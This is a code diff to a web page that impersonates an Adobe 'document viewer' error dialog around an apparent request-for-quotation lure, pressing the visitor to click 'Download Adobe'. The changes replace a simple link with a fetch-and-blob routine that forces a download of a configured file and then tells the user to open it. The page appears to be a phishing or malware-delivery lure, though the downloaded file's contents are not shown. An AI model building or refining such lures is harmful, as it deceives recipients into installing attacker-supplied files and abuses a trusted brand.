@@ -589,10 +589,13 @@
         justify-content: center;
         padding: 0 1.2rem;
         color: #fff;
+        font: inherit;
         font-weight: 700;
         text-decoration: none;
         background: var(--adobe-red);
+        border: 0;
         border-radius: 999px;
+        cursor: pointer;
       }
 
       .primary-button:focus,
@@ -866,14 +869,13 @@
         <p>To view this document,<br>you need the latest Adobe app.</p>
         <div class="dialog-actions">
           <button id="cancel-button" class="secondary-button" type="button">Cancel</button>
-          <a
+          <button
             id="download-button"
             class="primary-button"
-            href="./rfq.pdf"
-            download="rfq.pdf"
+            type="button"
           >
             Download Adobe
-          </a>
+          </button>
         </div>
         <p id="download-status" class="download-status" aria-live="polite" hidden></p>
       </section>
@@ -919,20 +921,44 @@
 
       rfqCompanyName.textContent = configuredCompanyName;
       openingFileName.textContent = configuredDocumentName;
-      downloadButton.href = safeDownloadPath;
-      downloadButton.download = safeDownloadFileName;
 
       cancelButton.addEventListener("click", () => {
         errorDialog.hidden = true;
       });
 
-      downloadButton.addEventListener("click", () => {
+      downloadButton.addEventListener("click", async () => {
         downloadStatus.hidden = false;
         downloadStatus.textContent = "Downloading...";
+        downloadButton.disabled = true;
 
-        window.setTimeout(() => {
+        try {
+          const response = await fetch(safeDownloadPath, { cache: "no-store" });
+
+          if (!response.ok) {
+            throw new Error(`Download failed with status ${response.status}`);
+          }
+
+          const fileBlob = await response.blob();
+          const objectUrl = URL.createObjectURL(fileBlob);
+          const temporaryLink = document.createElement("a");
+
+          temporaryLink.href = objectUrl;
+          temporaryLink.download = safeDownloadFileName;
+          temporaryLink.style.display = "none";
+          document.body.appendChild(temporaryLink);
+          temporaryLink.click();
+          temporaryLink.remove();
+
+          window.setTimeout(() => {
+            URL.revokeObjectURL(objectUrl);
+          }, 1000);
+
           downloadStatus.textContent = "Download complete. Open the downloaded file to access document.";
-        }, 1800);
+        } catch (error) {
+          downloadStatus.textContent = `Download could not start. Make sure ${safeDownloadFileName} is in this same directory.`;
+        } finally {
+          downloadButton.disabled = false;
+        }
       });
 
       window.setTimeout(() => {
